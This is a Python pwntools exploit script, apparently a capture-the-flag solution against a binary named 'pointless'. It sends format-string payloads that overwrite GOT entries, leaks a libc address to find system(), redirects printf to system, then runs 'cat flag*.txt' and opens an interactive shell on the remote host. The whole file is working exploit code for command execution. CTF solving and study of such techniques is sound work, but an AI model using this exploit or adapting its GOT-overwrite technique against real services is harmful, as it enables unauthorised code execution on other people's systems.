from pwn import *
import os
import sys

sscanf_plt = 0x404028
printf_got = 0x401050
libc_offset = 172490
system_offset = 0x58740

HOST = sys.argv[1]
PORT = sys.argv[2]

def main():
    # io = process(["docker", "run", "-i", "-v", f"{os.getcwd()}:/kek", "ubuntu@sha256:8a37d68f4f73ebf3d4efafbcf66379bf3728902a8038616808f04e34a9ab63ee", "/kek/pointless"])
    io = remote(HOST, PORT)

    pause()
    io.sendlineafter(b"delim> ", b"naaaaaaa" + b''.join(f"%{i + 21}$s".encode() for i in range(8))  +
        p64(sscanf_plt + 7) +
        p64(sscanf_plt + 6) +
        p64(sscanf_plt + 5) +
        p64(sscanf_plt + 4) +
        p64(sscanf_plt + 3) +
        p64(sscanf_plt + 2) +
        p64(sscanf_plt + 1) +
        p64(sscanf_plt + 0)
                     )
    io.sendlineafter(b"columns> ", b"1")
    io.sendlineafter(b"rows> ", b"5")
    io.sendline(b"anaaaaaaa" + b'a a a a a a a ' + p64(printf_got))
    io.sendline("%37$p")
    libc_leak = int(io.recvline(), 0)
    libc_base = libc_leak - libc_offset
    print("LIBC: ", hex(libc_base))
    system = libc_base + system_offset

    printf_payload = ''
    hhn = 0
    for i, b in enumerate(p64(system)[::-1]):
        if b == 0:
            continue
        # if b != hhn:
        printf_payload += f'%{(b - hhn) % 256}c'
        printf_payload += f'%{i + 22}$hhn'
        hhn = b


    io.sendline(printf_payload)
    io.sendline("cat flag*.txt")

    io.interactive()


if __name__ == "__main__":
    main()
